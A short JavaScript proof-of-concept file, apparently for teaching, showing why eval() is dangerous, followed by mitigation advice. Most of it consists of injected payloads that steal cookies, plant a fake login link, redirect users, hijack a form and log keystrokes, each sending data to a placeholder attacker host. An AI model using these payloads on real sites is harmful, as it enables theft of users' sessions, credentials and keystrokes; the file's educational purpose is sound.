

░▒▓████████▓▒ ░▒▓█▓▒░░▒▓█▓▒ ░░▒▓██████▓▒░░ ▒▓█▓▒░        
░▒▓█▓▒░       ░▒▓█▓▒░░▒▓█▓▒ ░▒▓█▓▒░░▒▓█▓▒░ ▒▓█▓▒░            ____   ____    
░▒▓█▓▒░        ░▒▓█▓▒▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ▒▓█▓▒░           /   ") (  " \   
░▒▓██████▓▒░   ░▒▓█▓▒▒▓█▓▒░ ░▒▓████████▓▒░ ▒▓█▓▒░          /. __/   \__. \  
░▒▓█▓▒░         ░▒▓█▓▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░ ▒▓█▓▒░         (: (__    __/ //
░▒▓█▓▒░         ░▒▓█▓▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░ ▒▓█▓▒░          \    )  /"   /   
░▒▓█▓▒░         ░▒▓█▓▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░ ▒▓█▓▒░           \"__/ (____/    
░▒▓████████▓▒░   ░▒▓██▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ ▒▓████████▓▒░ 

// Proof of Concept (PoC) situations of why  not to use eval()
// https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval
// dj substance / 9x

[*] Stealing Cookies
// An attacker can inject a script that uses eval() to send the user's cookies to their server.
// Attacker's input that gets passed to eval()

var maliciousInput = "fetch('http://yourlistenerboxIP/steal/index.php?cookies=' + document.cookie);";
  eval(maliciousInput);

[*] DOM Manipulation
// A script that manipulates the DOM to include malicious content, such as a phishing form.
  var maliciousInput = "document.body.innerHTML += '<h1>Your session has expired. 
     Please <a href=\"http://yourlistenerboxIP/fake-login\">log in again</a>.</h1>';";
   eval(maliciousInput);

[*] Redirecting Users
// Inject code that redirects users to a malicious site where they might be tricked into downloading malware or 
//  giving up sensitive information.
  var maliciousInput = "window.location = 'http://yourlistenerboxIP';";
  eval(maliciousInput);

[*] Executing Unauthorized Actions
// Execute actions on behalf of the user, such as submitting a form with altered action.
  var maliciousInput = "document.getElementById('someForm').action =
    'http://yourlistenerboxIP/capture-data'; document.getElementById('someForm').submit();";
  eval(maliciousInput);

[*] Keylogging
  // Inject a keylogger script that captures user keystrokes and sends them to the attacker.
  var maliciousInput = "document.onkeypress = function(e) { fetch('http://yourlistenerboxIP/keylog?k=' + e.key); };";
  eval(maliciousInput);

[*] Mitigation Strategies
  // Avoid eval(): The best mitigation is to avoid using eval() entirely. 
  // Modern JavaScript provides alternatives for most use cases where eval() might seem necessary.
  /* Strict Content Security Policies: Implement strict CSP rules to help mitigate the impact of injection vulnerabilities.
     Input Validation/Sanitization: Ensure that all user input is validated and sanitized to remove or neutralize potentially malicious 
     code before it is processed.
     Least Privilege: Run your JavaScript code with the least privilege necessary, limiting what actions scripts can perform 
     even if they are compromised.
  */
